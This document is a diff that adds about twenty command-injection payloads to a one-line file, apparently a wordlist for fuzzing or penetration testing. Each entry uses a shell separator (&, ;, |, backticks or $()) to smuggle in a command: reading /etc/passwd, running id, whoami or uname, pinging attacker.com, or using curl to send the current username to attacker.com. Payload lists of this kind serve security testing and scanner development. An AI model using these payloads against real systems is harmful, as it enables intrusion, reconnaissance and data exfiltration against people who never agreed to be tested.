@@ -1,1 +1,20 @@
+$(id)
+& cat /etc/passwd;
+; cat /etc/passwd;
+| cat /etc/passwd;
+& curl http://attacker.com/`whoami`;
+; curl http://attacker.com/`whoami`;
+| curl http://attacker.com/`whoami`;
+& id;
 ; id;
+`id`
+| id;
+& ping -c 3 attacker.com;
+; ping -c 3 attacker.com;
+| ping -c 3 attacker.com;
+& uname -a;
+; uname -a;
+| uname -a;
+& whoami;
+; whoami;
+| whoami;
